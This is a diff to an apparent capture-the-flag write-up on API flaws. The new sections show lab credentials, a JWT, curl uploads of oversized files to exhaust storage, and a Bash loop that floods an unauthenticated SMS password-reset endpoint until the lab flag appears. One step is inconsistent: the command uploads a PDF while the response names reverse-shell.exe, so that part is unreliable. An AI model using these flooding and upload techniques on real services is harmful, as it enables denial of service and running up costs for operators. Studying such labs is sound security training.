@@ -13,7 +13,8 @@ This document outlines common techniques for identifying and exploiting **API re
   - [Broken Object Property Level Authorization](#broken-object-property-level-authorization)
     - [Excessive Data Exposure](#excessive-data-exposure)
     - [Mass Assignment](#mass-assignment)
-
+  - [Unrestricted Resource Consumption](#unrestricted-resource-consumption)
+  - [Broken Function Level Authorization](#broken-function-level-authorization)
 ---
 
 ## Overview
@@ -705,3 +706,186 @@ This confirms that the authenticated supplier was able to modify a **business-cr
 The endpoint fails to enforce proper property-level authorization, allowing suppliers to exempt themselves from marketplace fees. This **mass assignment vulnerability** directly impacts platform revenue and demonstrates inadequate server-side validation of modifiable object attributes.
 
 ---
+
+## Unrestricted Resource Consumption
+
+An API is vulnerable to **Unrestricted Resource Consumption** when it fails to enforce limits on user-initiated actions that consume resources such as **network bandwidth**, **CPU**, **memory**, or **storage**. These resources incur real operational costs, and without safeguards—most **notably rate limiting** and **input validation**—an attacker can abuse the API to cause financial damage or denial-of-service conditions.
+
+The target is vulnerable to [CWE-400, Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html). 
+
+A brief description of the weakness is shown below:
+
+```
+The product does not properly control the allocation and maintenance of a limited resource.
+```
+
+Authentication is performed via the `/api/v1/authentication/suppliers/sign-in` endpoint:
+
+```
+{
+  "Email": "htbpentester8@pentestercompany.com",
+  "Password": "HTBPentester8"
+}
+```
+
+The server responds with a valid JWT:
+
+```json
+{
+  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjhAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0IiwiU3VwcGxpZXJDb21wYW5pZXNfVXBsb2FkQ2VydGlmaWNhdGVPZkluY29ycG9yYXRpb24iXSwiZXhwIjoxNzY4MDUxMjkyLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.wbxZ-S7c5erl5gYeG8Vpuagr2Kt8H_Gcy6SsEHFe5W6-RVPnmv7pUwDrfFAblSXUA_u4YpZKhBVPdKxJMcoH4w"
+}
+```
+
+After authorizing with the JWT, querying `/api/v1/roles/current-user` shows that the authenticated user has the following roles:
+
+- `SupplierCompanies_Get`
+- `SupplierCompanies_UploadCertificateOfIncorporation`
+
+![Filtered output](images/r-consumption.PNG)
+
+Reviewing the `SupplierCompanies` endpoints shows that only one endpoint is associated with the `SupplierCompanies_UploadCertificateOfIncorporation` role:
+
+```
+/api/v1/supplier-companies/certificates-of-incorporation POST
+```
+
+![Filtered output](images/r-consumption2.PNG)
+
+This endpoint allows suppliers to upload a **certificate of incorporation** in PDF format. The request requires both a file upload and a `CompanyID`.
+
+The `companyID` can be retrieved via:
+
+```
+/api/v1/supplier-companies/current-user
+```
+
+Response:
+
+```json
+{
+  "supplierCompany": {
+    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
+    "name": "PentesterCompany",
+    "email": "supplier@pentestercompany.com",
+    "isExemptedFromMarketplaceFee": 0,
+    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
+  }
+}
+```
+
+Using the obtained `CompanyID`, we first generate a 30 MB PDF file filled with random data:
+
+```bash
+dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
+```
+
+We then upload the file:
+
+```bash
+curl -X 'POST' \
+  'http://94.237.53.219:33259/api/v1/supplier-companies/certificates-of-incorporation' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>' \
+  -H 'Content-Type: multipart/form-data' \
+  -F 'CertificateOfIncorporationPDFFormFile=@certificateOfIncorporation.pdf;type=application/pdf' \
+  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
+```
+
+The upload succeeds, and the response confirms both the file size and storage location:
+
+```json
+{
+  "successStatus": true,
+  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/certificateOfIncorporation.pdf",
+  "fileSize": 31457280
+}
+```
+
+![Filtered output](images/r-consumption3.PNG)
+
+This demonstrates that the endpoint does **not enforce file size limits**. Without additional safeguards such as rate limiting, an attacker could repeatedly upload large files and exhaust available disk storage, leading to denial-of-service conditions and increased operational costs.
+
+To further test input validation, we attempt to upload a non-PDF file. We create a 30 MB executable file:
+
+```bash
+dd if=/dev/urandom of=reverse-shell.exe bs=1M count=30
+```
+
+We then submit the upload request again:
+
+```bash
+curl -X 'POST' \
+  'http://94.237.53.219:33259/api/v1/supplier-companies/certificates-of-incorporation' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer <JWT>' \
+  -H 'Content-Type: multipart/form-data' \
+  -F 'CertificateOfIncorporationPDFFormFile=@certificateOfIncorporation.pdf;type=application/pdf' \
+  -F 'CompanyID=b75a7c76-e149-4ca7-9c55-d9fc4ffa87be'
+```
+
+
+The upload succeeds:
+
+```json
+{
+  "successStatus": true,
+  "fileURI": "file:///app/wwwroot/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe",
+  "fileSize": 31457280
+}
+```
+
+This confirms that the endpoint does **not validate file type or content**. If a malicious executable were uploaded and later accessed by an administrator or automated process, this could result in **remote code execution**.
+
+Another endpoint vulnerable to **Unrestricted Resource Consumption** is:
+
+```
+/api/v1/authentication/customers/passwords/resets/sms-otps
+```
+
+The endpoint documentation states:
+
+```
+This endpoint sends an OTP via SMS to the Customer's phone number when they want to reset their password.
+The SMS provider we are working with charges us a significant amount per message. We need to request a discount from them; otherwise, our revenues will decrease.
+Role(s) required: None
+```
+
+Each request incurs a direct financial cost. Because the endpoint does not implement rate limiting or authentication, it can be abused to generate excessive SMS traffic.
+
+The request format is as follows:
+
+```bash
+curl -X 'POST' \
+  'http://94.237.53.219:33259/api/v1/authentication/customers/passwords/resets/sms-otps' \
+  -H 'accept: application/json' \
+  -H 'Content-Type: application/json' \
+  -d '{
+  "Email": "htbpentester8@pentestercompany.com"
+}'
+```
+
+We automate repeated requests using a simple Bash script:
+
+```bash
+#!/usr/bin/env bash
+
+for ((i=1; i<20; i++)); do
+  curl -X 'POST' \
+  'http://94.237.53.219:33259/api/v1/authentication/customers/passwords/resets/sms-otps' \
+  -H 'accept: application/json' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "Email": "htbpentester8@pentestercompany.com"
+  }'
+done
+```
+
+Executing the script triggers repeated SMS requests. After the tenth request, the API returns the flag:
+
+```
+{"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
+```
+
+---
+
+## Broken Function Level Authorization
